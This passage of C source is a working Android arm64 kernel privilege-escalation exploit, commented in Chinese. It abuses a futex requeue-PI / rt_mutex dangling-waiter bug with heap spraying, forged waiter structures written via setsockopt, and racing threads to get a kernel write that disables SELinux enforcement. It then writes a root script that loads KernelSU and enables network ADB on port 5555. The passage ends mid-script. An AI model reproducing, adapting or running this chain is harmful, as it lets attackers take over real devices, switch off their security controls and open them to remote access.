    /* prio 必须 != task->prio（[反汇编] 0x81348e8 ldr w8,[x19,#132] / 0x81348f0 cmp w9,w8
     * / 0x81348f4 b.ne => 不等则跳过 deadline 比较，直奔门4）。
     * 真实线程 prio 实测 120，这里填 0（==0 一定不等）。 */
    p[STAMP_PRIO_OFF / 8] = 200;  /* A101: 0->200。原注释只担心 prio==task->prio，但 prio=0 会让本waiter在真树里成为 rbm755 最小值 = rb_leftmost，于是 rt_mutex_top_waiter 命中本 waiter 而它的 lock 已被 stamp 成 fake_lock，必然触发 BUG_ON(w->lock!=lock)=run19 的 +0x65c。改 200 后：① prio!=120 仍使 +0xc4 b.ne 正常放行；② 不会成为 leftmost。 */
    /* ===== gK65 重大修复：waiter->task 必须是 fake_task =====
     * [A-源码] rtmutex.c:340-346 rt_mutex_adjust_prio(p)：
     *     if (task_has_pi_waiters(p)) pi_task = task_top_pi_waiter(p)->task;
     * [A-源码] rtmutex_common.h:70  task_top_pi_waiter(p) =
     *     rb_entry(p->pi_waiters.rb_leftmost, waiter, pi_tree_entry)
     * [A-源码] rbtree.h:66  rb_entry(ptr,type,member) = container_of = ptr - offsetof(member)
     *     ⇒ 返回 rb_leftmost - 0x18，不是 rb_leftmost 本身！
     *
     * [执行时序] [11] 里依次 dequeue_pi(fake_task,w1) → enqueue_pi(fake_task,waiter)
     *     → adjust_prio(fake_task)。此时 rb_leftmost = &waiter->pi_tree_entry = waiter+0x18
     *     ⇒ task_top_pi_waiter 返回 (waiter+0x18)-0x18 = **waiter**
     *     ⇒ pi_task = waiter->task = *(waiter+0x30)
     *
     * [旧 bug] 旧代码把 waiter->task 写 0 ⇒ pi_task = NULL。
     *     而 rt_mutex_setprio 的提前返回条件是
     *         p->pi_top_task == pi_task && prio == p->prio && !dl_prio(prio)
     *     其中 p->pi_top_task = fake_task（payload 写入），pi_task = NULL
     *     ⇒ fake_task != NULL ⇒ 提前返回不成立
     *     ⇒ 进 __task_rq_lock/dequeue_task/put_prev_task 完整调度器操作
     *     ⇒ 对伪造的 fake_task 必然挂死 ⇒ HWT（gK63 04:51:50 实测）。
     *
     * [修复] 把 waiter->task 写成 fake_task ⇒ pi_task = fake_task == p->pi_top_task ✓
     *     且 prio = min(fake_task->prio=120, fake_task->normal_prio=120) = 120 == p->prio ✓
     *     且 !dl_prio(120) ✓ ⇒ **提前返回成立，不进调度器**。
     */
    p[STAMP_TASK_OFF / 8] = (uint64_t)fake_task;
    p[STAMP_DL_OFF / 8]   = 0;
  }
}

/* 写入目标：默认 selinux_enforcing。STAMP_TARGET 可覆盖（十六进制）。 */
static uintptr_t stamp_target_addr(void) {
  uintptr_t t = (uintptr_t)env_ulong("STAMP_TARGET", 0);
  if (t) return t;
  if (active_offsets && active_offsets->off_selinux_enforcing)
    return text_addr(KIMAGE_TEXT_BASE + active_offsets->off_selinux_enforcing);
  return text_addr(SELINUX_ENFORCING);
}

static void stamp_fd_prepare(void) {
  if (stamp_fd >= 0) return;
  stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (stamp_fd < 0) pr_error("stamp: socket failed errno=%d\n", errno);
}

/* ===== 重建106：改用 optname=42 (MCAST_JOIN_GROUP)，只拷贝 0x88 字节 =====
 * do_ip_setsockopt 跳转表（实测解析 vmlinux2.elf）：
 *   optname {43,44,46,47} -> 0x8f1c0a0 : cmp optlen,#0x108 ; copy 0x108
 *   optname {42,45}       -> 0x8f1c20c : cmp optlen,#0x88  ; copy 0x88
 *   optname {35,36}       -> 0x8f1c184
 * 0x108 = sizeof(struct group_source_req)  → 会覆盖到 waiter->lock(0xA8)、task(0xA0)，
 *         把 lock 清 0 ⇒ 后续 commit 步骤 __raw_spin_trylock(lock=0) 必崩
 *         （这正是历史"形态A"崩在 _raw_spin_trylock+0x1c 的真因）。
 * 0x88  = sizeof(struct group_req)         → 只覆盖 buf[0..0x87]，
 *         即 waiter+0x00..0x17（rb 三个字），lock/task/prio 全部保持真实值 ✅
 * 注：{42,45} 分支先 cmp w23,#0x88 ; b.cc → optlen 必须 >= 0x88。
 */
/* 必须在 futex 返回后、任何其他系统调用之前调用 */
static void stamp_do(void) {
  /* 观测点 1：确认函数真的被调用（纯用户态 store，不产生 syscall） */
  atomic_fetch_add(&stamp_obs_enter, 1);
  atomic_store(&stamp_obs_fd, (long)stamp_fd);
  atomic_store(&stamp_obs_off, (long)STAMP_WAITER_OFF);
  if (stamp_fd < 0) {
    /* stamp 从未发生：记录后直接返回，不产生任何 syscall */
    atomic_store(&stamp_obs_done, -1);
    return;
  }
  /* ===== gK80：运行时把 waiter->lock 重定位到 payload 页内（纯用户态）=====
   * 目的：制造「挂死 vs 崩溃」这一对【正交】结局，把“stamp 到底有没有
   *   写成 waiter->lock”从不可观测变成可观测（不必依赖 pstore/dmesg）。
   *
   * [机理 A-源码] kernel/locking/rtmutex.c:585
   *     lock = waiter->lock;
   *     if (!raw_spin_trylock(&lock->wait_lock)) {
   *         raw_spin_unlock_irq(&task->pi_lock); cpu_relax(); goto retry;
   *     }
   *   goto retry 跳过了 again 处的 ++depth ⇒ 真·无限自旋，**不崩溃**。
   *
   * [判据] waiter->lock = page_base + FL_PBOFF，若该地址首 u32 != 0，
   *   raw_spin_trylock 必失败 ⇒ 该线程在内核里自旋挂死；
   *   表现为：进程存活 / wd_beat 继续增长 / 设备不重启 / 单 CPU 100%。
   *   反之若 stamp 未生效，waiter->lock 仍是内核原值，绝不会等于
   *   page_base+FL_PBOFF ⇒ 不可能出现上述挂死。
   *   所以「挂死」是 stamp 生效的**充分且唯一**证据。
   *
   * [为何选 0x1D00] W1_OFF 处有 put64(W1_OFF+0x00, 1) ⇒ 首 u32 = 1 != 0。
   * [安全性] 全程只写用户态 stamp_buf，getenv/strtoul 不产生 syscall，
   *   保证“futex 返回后唯一一个 syscall 仍是 setsockopt”。
   * FL_PBOFF=0（默认）时不启用，退回原有 FAKE_LOCK / fake_lock 路径。
   */
  {
    unsigned long pboff = env_ulong("FL_PBOFF", 0);
    if (pboff && page_base) {
      uint64_t nl = (uint64_t)(page_base + (uintptr_t)pboff);
      *(uint64_t *)(void *)(stamp_buf + STAMP_LOCK_OFF) = nl;
    }
  }
  errno = 0;
  /* STAMP_LEN 覆盖：用于"同一栈帧但不拷贝"对照实验。
   * 0x108 是 {43,44,46,47} 分支的精确要求；传其他值（如 0x100）
   * 会走 0x8f1c0a4 b.ne -> 0x8f1c910 release_sock 出口，返回 -EINVAL，
   * copy_from_user 完全不执行，但整条 syscall 调用链栈帧一模一样。
   * 若此时仍崩门4 => 元凶是 syscall 栈帧本身，不是拷贝数据。 */
  size_t optlen = (size_t)env_int_range("STAMP_LEN", (int)sizeof(stamp_buf), 0, 0x400);
  int optname = env_int_range("STAMP_OPTNAME", 46, 0, 200);
  /* ===== gK100：keep_lock 模式强制 {optname=42, optlen=0x88} =====
   * 只让 copy_from_user 写 waiter+0x00..0x07（即 __rb_parent_color=pc），
   * rb_right/rb_left/task/lock/prio/dl 全部保留内核真实值。
   * 这样 [5] trylock 打的是真实 &f_pi_target_mutex.wait_lock，
   * [11] 的 BUG_ON(w->lock != lock) 也能通过。 */
  if (stamp_keep_lock_mode) {
    optname = 42;   /* MCAST_LEAVE_GROUP：走 cmp w23,#0x88 分支 */
    optlen  = 0x88; /* 136 字节 */
  }
  atomic_store(&stamp_obs_optlen, (int)optlen);
  /* 重建121（gK28）：optname 默认改为 46 (MCAST_JOIN_SOURCE_GROUP)，走 {43,44,46,47}
   * 分支拷贝 0x108 字节，才能覆盖到 buf[0xA8] = waiter->lock。
   * STAMP_OPTNAME 可覆盖（42=0x88 旧行为，46=0x108 新行为）。 */
  int r = setsockopt(stamp_fd, IPPROTO_IP, optname,
                     stamp_buf, optlen);
  int e = errno;
  /* 观测点 2：记录 setsockopt 真实返回值（纯用户态 store，不产生 syscall） */
  atomic_store(&stamp_obs_ret, (long)r);
  atomic_store(&stamp_obs_errno, (long)e);
  atomic_fetch_add(&stamp_obs_done, 1);
  /* 预期失败(EADDRNOTAVAIL/EINVAL)：family 校验在 copy_from_user 之后，
     stamp 已生效，失败是正常且期望的。 */
  if (!stamp_quiet) {   /* QUIET 模式：避免 write() 系统调用复用内核栈覆盖已 stamp 的区域 */
    ckpt_val("stamp_ret", (long)r);
    ckpt_val("stamp_errno", (long)e);
  }
  stamp_last_ret = (long)r;
  stamp_last_errno = (long)e;
}

/* 第4线程：在 owner 持锁期间对 f_pi_chain 排队，保证真实锁树非空 */
static long sched_setattr_policy(int tid, unsigned int policy, int nice_value) {
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = policy;
  attr.sched_nice = nice_value;
  errno = 0;
  return syscall(274, tid, &attr, 0);
}

void *parker_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* 等 owner 持有 f_pi_target（owner_started 置位即代表 owner 已拿到该锁）。
   * 注意：PI walk 用的 lock 是 waiter 阻塞所在的 f_pi_target，不是 f_pi_chain。
   * waiter 在 FUTEX_WAIT_REQUEUE_PI 里 task_blocks_on_rt_mutex(f_pi_target)，
   * 所以 waiter->lock == &f_pi_target。futex 超时回滚时 remove_waiter() 把它摘掉，
   * 树就空了 -> rt_mutex_top_waiter() 返回 NULL -> NULL+0x38（形态B 实测根因）。
   * parker 对 f_pi_target 做 FUTEX_LOCK_PI 阻塞排队，树里就一直有个合法 waiter。 */
  /* 必须等 waiter 真正进入 FUTEX_WAIT_REQUEUE_PI 并完成入队之后再排队，
   * 否则 parker 会成为树里的第一个（top）waiter，而 PI walk 走的是
   * task->pi_blocked_on（= waiter 自己的 rt_waiter），两者不是同一个。
   * waiter_waiting 在 futex 调用前置位，再靠 usleep 让出 CPU 保证入队完成。 */
  while (!atomic_load(&waiter_waiting)) usleep(1000);
  atomic_store(&parker_ready, 1);
  { volatile int warm = 0; while (warm < 5000) warm++; }
  /* 阻塞在这里（owner 持有 f_pi_target），不会返回 */
  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&parker_done, 1);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  ckpt_begin("owner_lock_pi_target");
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  ckpt_end("owner_lock_pi_target");
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  ckpt_begin("owner_lock_pi_chain");
  /* ===== 重建105：这里必须【保持阻塞】，不能打断死锁环 =====
   * A 持 f_pi_chain 并等 f_pi_target；B 持 f_pi_target 并等 f_pi_chain  => 死锁环。
   * 环存在 => C 的 CMP_REQUEUE_PI 在 rt_mutex_adjust_prio_chain 步骤[6] 命中
   *   rt_mutex_owner(f_pi_chain) == top_task(A)  => ret = -EDEADLK
   * => rt_mutex_start_proxy_lock 失败 => remove_waiter(f_pi_target_mutex, A_waiter)
   *    而 current = C ≠ waiter->task(A) => 只清 C->pi_blocked_on，
   *    A->pi_blocked_on 保持指向 A 栈上的 rt_waiter  => 悬空成立 ★
   * 反之：若让 owner 成功拿到 f_pi_chain（环破）=> 不会 EDEADLK，
   *   A 会被正常入队并在 cleanup 时被正确清理 => 悬空消失，漏洞不成立。
   * 所以此处【故意】让它一直阻塞到 waiter 超时/解锁。 */
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  ckpt_end("owner_lock_pi_chain");
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

static int read_task_prio(int tid){
  /* /proc/self/stat 解析到的是 TGID(组长线程)，必须走 /proc/self/task/<tid>/ */
  char path[96];
  snprintf(path,sizeof(path),"/proc/self/task/%d/stat",tid);
  char b[512];
  int fd=open(path,O_RDONLY);
  if(fd<0) return -1;
  int n=read(fd,b,sizeof(b)-1);
  close(fd);
  if(n<=0) return -1;
  b[n]=0;
  char *rp=strrchr(b,')');
  if(rp==NULL) return -1;
  rp++;
  /* 跳过 " R " 状态字段 -> field=3 起 */
  int field=3;
  char *tok=strtok(rp," ");
  while(tok){
    if(field==18) return atoi(tok);
    field++;
    tok=strtok(NULL," ");
  }
  return -1;
}
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int self_tid = (int)syscall(SYS_gettid);
  pr_info("consumer: baseline sched_setattr on self tid=%d (no PI)\n", self_tid);
  errno = 0;
  long self_ret = sched_setattr_tid(self_tid, 19);
  { int mp=read_task_prio(self_tid); ckpt_val("self_prio_after_batch19",(long)mp);
    pr_info("consumer: self prio after BATCH nice=19 -> %d\n", mp); }
  pr_info("consumer: baseline ret=%ld errno=%d\n", self_ret, errno);

  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&consumer_disabled)) {
        __asm__ volatile("yield" ::: "memory");
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      ckpt_val("cons_armed", (long)seq);
      ckpt_val("cons_delay_usec", (long)delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      ckpt_val("cons_after_sleep", (long)seq);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        pr_info("consumer: pre-sched tid=%d\n", tid);
        errno = 0;
        ckpt_val("cons_tid_target", (long)tid);
        ckpt_val("cons_call_idx", (long)atomic_load(&consumer_calls));
        ckpt_begin("consumer_sched_setattr");
        long sched_ret;
        if (env_int_range("DIAG", 0, 0, 9) >= 8) {
          /* 必须让 policy 或 nice 真正变化，否则 core.c:5520 直接 return 0。
           * waiter 当前是 SCHED_BATCH(3)+nice19；这里用 SCHED_OTHER(0)+nice10。 */
          unsigned int pol = (unsigned int)env_int_range("SETATTR_POLICY", 0, 0, 6);
          int nv = env_int_range("SETATTR_NICE", 10, -20, 19);
          sched_ret = sched_setattr_policy(tid, pol, nv);
        } else {
          sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        }
        ckpt_val("cons_sched_ret", (long)sched_ret);
        ckpt_val("cons_sched_errno", (long)errno);
        ckpt_end("consumer_sched_setattr");
        int sched_errno = errno;
        pr_info("consumer: sched ret=%ld errno=%d\n", sched_ret, sched_errno);
        if (sched_ret != 0) {
          pr_info("consumer: pre-futex-lock\n");
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          ckpt_begin("consumer_lock_pi_target");
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          ckpt_end("consumer_lock_pi_target");
          pr_info("consumer: futex-lock ret=%ld errno=%d\n", fret, errno);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

/* ===== gK74：挂死现场 watchdog =====
 * [问题 A 级实测 2026-10-22 08:00] consumer_sched_setattr 内部挂死后，
 *   main 线程永远阻塞在 `while (!atomic_load(&route_done))`，
 *   导致其后所有探针（obs_stamp_* 等）【永远写不出来】。
 *   ckpt 只能停在 "BEGIN consumer_sched_setattr"，无法判定挂死前状态。
 * [做法] 独立线程，每 500ms 把关键原子量写入 ckpt（带序号）。
 *   它有自己的内核栈，写盘不影响 waiter 的 rt_waiter。
 *   挂死后最后一行就是「挂死前瞬间的现场」。
 * [判据]
 *   wd_beat 持续增长 ⇒ 本线程仍被调度 ⇒ 不是全系统死锁（印证"屏幕卡死但系统还在跑"）
 *   wd_beat 停止增长 ⇒ 全系统死锁
 *   wd_stamp_done=1 且 wd_stamp_ret 可读 ⇒ stamp 真的执行了
 *   wd_calls 停在 1 ⇒ 第 1 次 sched_setattr 即挂死
 */
static void *watchdog_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long beat = 0;
  for (;;) {
    beat++;
    ckpt_val("wd_beat", beat);
    ckpt_val("wd_stamp_enter", (long)atomic_load(&stamp_obs_enter));
    ckpt_val("wd_stamp_done",  (long)atomic_load(&stamp_obs_done));
    ckpt_val("wd_stamp_fd",    (long)atomic_load(&stamp_obs_fd));
    ckpt_val("wd_stamp_ret",   (long)atomic_load(&stamp_obs_ret));
    ckpt_val("wd_stamp_errno", (long)atomic_load(&stamp_obs_errno));
    ckpt_val("wd_stamp_optlen",(long)atomic_load(&stamp_obs_optlen));
    ckpt_val("wd_stamp_off",   (long)atomic_load(&stamp_obs_off));
    ckpt_val("wd_calls",       (long)atomic_load(&consumer_calls));
    ckpt_val("wd_success",     (long)atomic_load(&consumer_success));
    ckpt_val("wd_go",          (long)atomic_load(&punch_consume_go));
    ckpt_val("wd_route_done",  (long)atomic_load(&route_done));
    /* ===== gK77：运行时观测 fake_lock 树状态（解 gK76 的 +0x14c 矛盾）=====
     * [gK76 矛盾] 探针显示 fake_lock+0x10 = base+0x1D00（非0），
     *   但内核在 +0x14c 执行 `ldr x8,[x27,#56]`（x27=[lock+0x10]）时崩溃。
     *   可能：(a) x24 不是 fake_lock；(b) rb_leftmost 被改写；(c) base 页不可读。
     * [做法] watchdog 每轮直接解引用 fake_lock+0x08/+0x10/+0x18，
     *   若读得到值 ⇒ 页可读，排除(c)；若值变化 ⇒ 是(b)；
     *   若始终等于 w1 而仍崩 ⇒ 是(a)。
     * [安全] 只在 fake_lock 非 0 且页可读时读；若页不可读会崩，
     *   但这本身也是 A 级信息（说明 base 页在此时已不可读）。
     * 注意：用 volatile 读取，避免被优化掉。 */
    if (fake_lock && env_flag("WD_FL", 0)) {
      volatile uint64_t *fl = (volatile uint64_t *)(void *)fake_lock;
      ckpt_val("wd_fl_addr", (long)fake_lock);
      ckpt_val("wd_fl_wl",   (long)(*(volatile uint32_t *)(void *)fake_lock));
      ckpt_val("wd_fl_node", (long)fl[1]);   /* +0x08 rb_node */
      ckpt_val("wd_fl_left", (long)fl[2]);   /* +0x10 rb_leftmost */
      ckpt_val("wd_fl_own",  (long)fl[3]);   /* +0x18 owner */
    }
    usleep(500000);
  }
  return NULL;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer, parker;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  /* DIAG=8: park a 4th thread on f_pi_chain so the REAL lock tree is
   * non-empty (needed by rt_mutex_top_waiter at rtmutex.c:661), and
   * pre-create the stamp socket (no syscall allowed after futex returns). */
  { int dm = env_int_range("DIAG", 0, 0, 9);
    if (dm == 8 || dm == 9) {
      atomic_store(&parker_ready, 0);
      atomic_store(&parker_done, 0);
      stamp_fd_prepare();
      stamp_buf_init(stamp_target_addr(), env_int_range("STAMP_V", 0, 0, 3));
      /* DIAG=9 = 对照组：只 stamp，不创建 parker。
       * 用于验证"parker 是否导致 pi_blocked_on 被清空"。 */
      if (dm == 8) SYSCHK(pthread_create(&parker, NULL, parker_thread, NULL));
    }
  }
  /* ===== gK75：watchdog 必须在 stamp_fd_prepare() 之后启动 =====
   * [gK74 教训] 原代码把 watchdog 放在 stamp_fd_prepare 之前，
   *   导致前几次心跳读到 stamp_fd=-1（socket 还没建），
   *   容易被误判为「socket 创建失败」。
   * 移到此处后，wd_stamp_fd 从第一次心跳起就是有效 fd。 */
  {
    pthread_t wd;
    if (env_flag("WD_ON", 1)) {
      pthread_create(&wd, NULL, watchdog_thread, NULL);
      pthread_detach(wd);
    }
  }
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  /* DIAG=8: 等 parker 已进入 FUTEX_LOCK_PI 排队，保证 f_pi_chain 树非空。
   * usleep 让出 CPU 使 parker 完成入队。 */
  if (env_int_range("DIAG", 0, 0, 9) == 8) {
    while (!atomic_load(&parker_ready)) usleep(1000);
    usleep(80000);   /* 让 parker 完成 FUTEX_LOCK_PI 入队 */
  }
  usleep(50000);
  errno = 0;
  ckpt_begin("main_cmp_requeue_pi");
  long req_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int req_errno = errno;
  ckpt_end("main_cmp_requeue_pi");
  /* Decisive diagnostic (from the aresin audit): the dangling
   * waiter only exists when the requeue rollback failed with -EDEADLK.
   * ret >= 0 means no dangling pointer, so the PI walk can never reach a
   * fake waiter no matter what we stamp. */
  pr_info("CMP_REQUEUE_PI ret=%ld errno=%d (%s)\n", req_ret, req_errno,
          req_ret < 0 ? (req_errno == EDEADLK ? "EDEADLK => dangling" : "NEGATIVE(other)=>no dangling") : "NON-NEGATIVE => no dangling");
  ckpt_val("cmp_ret", (long)req_ret);
  ckpt_val("cmp_errno", (long)req_errno);
  ckpt_val("cmp_dangling", (long)(req_ret < 0 && req_errno == EDEADLK ? 1 : 0));
  ckpt_val("pi_target", (long)f_pi_target);
  ckpt_val("pi_chain", (long)f_pi_chain);
  ckpt_val("fire_from_main", (long)atomic_load(&fire_from_main));
  ckpt_val("punch_go_before", (long)atomic_load(&punch_consume_go));
  /* FIRE_FROM_MAIN: trigger the consumer NOW, while the waiter is still blocked
   * inside FUTEX_WAIT_REQUEUE_PI on the requeue list (waiter still alive).
   * The original code let the waiter's futex time out first (1s), so the PI
   * walk ran against a released waiter -> UAF -> panic. */
  if (atomic_load(&fire_from_main)) {
    usleep(2000);
    ckpt_begin("main_fire_consumer");
    atomic_store(&punch_consume_go, 1);
    while (atomic_load(&consumer_calls) == 0)
      __asm__ volatile("yield" ::: "memory");
    ckpt_end("main_fire_consumer");
  }
  /* ===== 观测点写盘（重建113）=====
   * A 线程 stamp_do() 在 punch_consume_go=1 之前执行完毕（代码顺序保证），
   * 且之后 A 只做纯用户态 spin，所以这里读到的原子变量就是 stamp 的真实结果。
   * 本线程有独立内核栈，写盘不会影响 A 的 rt_waiter。
   *
   * 【时序约束】FIRE_FROM_MAIN=0 时 main 不 fire，A 的 futex 要等
   * ROUTE_WAIT_SECONDS(1s) 超时才返回并 stamp。若此时立刻写盘，
   * 读到的是全 0（stamp 还没发生）。因此必须等 stamp_obs_enter 非 0。
   * 有超时保护，避免 A 根本没走到 stamp 时死等。 */
  {
    int waited_ms = 0;
    /* 必须等 done 非 0（stamp_do 走完全部路径，含 setsockopt 返回），
     * 仅等 enter 会在 setsockopt 执行途中就写盘，读到半成品。
     * done = -1 表示 stamp_fd<0 提前返回；done = 1 表示 setsockopt 已完成。 */
    while (atomic_load(&stamp_obs_done) == 0 && waited_ms < 3000) {
      usleep(5000);
      waited_ms += 5;
    }
    ckpt_val("obs_wait_ms", (long)waited_ms);
  }
  ckpt_val("obs_stamp_enter", (long)atomic_load(&stamp_obs_enter));
  ckpt_val("obs_stamp_done",  (long)atomic_load(&stamp_obs_done));
  ckpt_val("obs_stamp_fd",    (long)atomic_load(&stamp_obs_fd));
  ckpt_val("obs_stamp_ret",   (long)atomic_load(&stamp_obs_ret));
  ckpt_val("obs_stamp_errno", (long)atomic_load(&stamp_obs_errno));
  ckpt_val("obs_stamp_optlen",(long)atomic_load(&stamp_obs_optlen));
  ckpt_val("obs_stamp_off",   (long)atomic_load(&stamp_obs_off));
  while (!atomic_load(&route_done)) usleep(5000);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  /* CHILD_NODE=0 selects the LEAF erase path: fake_right=0, so rb_erase does
   * *(node->rb_left=target) = node->rb_parent_color = 0  → writes 0 to target
   * with no further dereference (parent==0 → early return). CHILD_NODE=1 keeps
   * the legacy child-node construction. */
  pselect_child_node = env_flag("CHILD_NODE", 1);
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  ckpt_begin("w_heap_spray");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  ckpt_end("w_heap_spray");
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  ckpt_begin("w_route");
  run_main_route_threads();
  ckpt_end("w_route");
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void slab_drain(void) {
  /* ===== gK73 修复：进程爆炸（A 级实测 2026-10-22）=====
   * [旧代码]
   *   int waves = (up.tv_sec > 60) ? 5 : 2;
   *   int batch = (up.tv_sec > 60) ? 400 : 200;
   * [问题] 设备 uptime 早已 >60s ⇒ 永远 5×400 = 2000 个 fork。
   *   本函数在 DIAG=8 spray 路径中【每次 prepare_kernel_page 重试都会调用】，
   *   24 次重试 ⇒ 最多 48000 次 fork。实测 ps -A 出现 1186 个 gK72 进程，
   *   load average 飙到 45-50，mm_struct slab 被大量进程污染
   *   ⇒ bf_pass3 恒为 0（泄漏全失败）⇒ 越跑越差的正反馈。
   * [修复] 规模改为环境变量可调，默认 2×128（=256，仅为原来的 1/8）；
   *   fork 失败立即中止该波；回收改为 while(waitpid<0 && EINTR) 确保零僵尸。
   *   可用 MAIN_DRAIN_WAVES / MAIN_DRAIN_BATCH 覆盖。 */
  int waves = env_int_range("MAIN_DRAIN_WAVES", 2, 0, 8);
  int batch = env_int_range("MAIN_DRAIN_BATCH", 128, 0, 512);
  if (waves <= 0 || batch <= 0) return;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
      else break;              /* fork 失败（内存/pid 上限）⇒ 立即停止该波 */
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      while (waitpid(drain[i], NULL, 0) < 0 && errno == EINTR) { }
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  echo '[+] KernelSU already loaded'\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  echo '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  echo '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  echo '[*] ksud late-load --kmi' $KMI\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  echo '[*] ksud pid='$KSUD_PID\n"
    "  for w in $(seq 1 30); do\n"
    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
    "    sleep 1\n"
    "  done\n"
    "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' || echo '[!] KSU NOT loaded'\n"
    "  grep kernelsu /proc/modules && echo '[+] KSU loaded' || echo '[!] KSU NOT loaded'\n"
    "fi\n"
    "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -n \"$RSPROP\" ]; then\n"
    "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port 5555 2>&1 && echo '[+] persist.adb.tcp.port=5555 set via resetprop'\n"
    "  \"$RSPROP\" resetprop service.adb.tcp.port 5555 2>/dev/null\n"
    "fi\n"
